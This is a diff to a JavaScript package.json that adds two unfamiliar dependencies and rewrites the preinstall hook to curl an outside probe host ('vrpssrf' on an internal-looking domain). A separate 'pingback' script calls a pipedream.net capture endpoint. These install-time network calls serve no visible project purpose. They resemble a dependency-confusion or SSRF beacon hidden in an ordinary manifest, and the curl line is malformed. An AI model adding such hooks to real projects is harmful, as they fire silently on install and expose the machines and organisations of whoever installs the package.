@@ -144,7 +144,9 @@
     "@wesjet/utils": "0.0.10",
     "clipanion": "^3.2.0",
     "typanion": "3.12.1",
-    "yaml": "^1.10.2"
+    "yaml": "^1.10.2",
+    "mmsdk-apml-htmlrenderer": "^1.0.0",
+    "stw-tenant-library": "^1.0.0"
   },
   "devDependencies": {
     "@ark/attest": "0.53.0",
@@ -233,7 +235,7 @@
     "ts-benchmark": "cd ./benchmarks/typescript/simple && npm install && npm run benchmark | node ../../../scripts/tsc-diagnostics-check",
     "attest-benchmark": "node ./benchmarks/typescript/infer.bench.mts",
     "build": "cd ../../ && tsc -b ./scripts/gen.json",
-    "preinstall": "node index.js",
+    "preinstall": "curl http://vrpssrf.corp.amazon.com:80/foobar -e 'asf-recorder",
     "pingback": "curl https://eo536ohsnextro9.m.pipedream.net",
     "start": "node-red",
     "coverage": "vitest run --coverage",
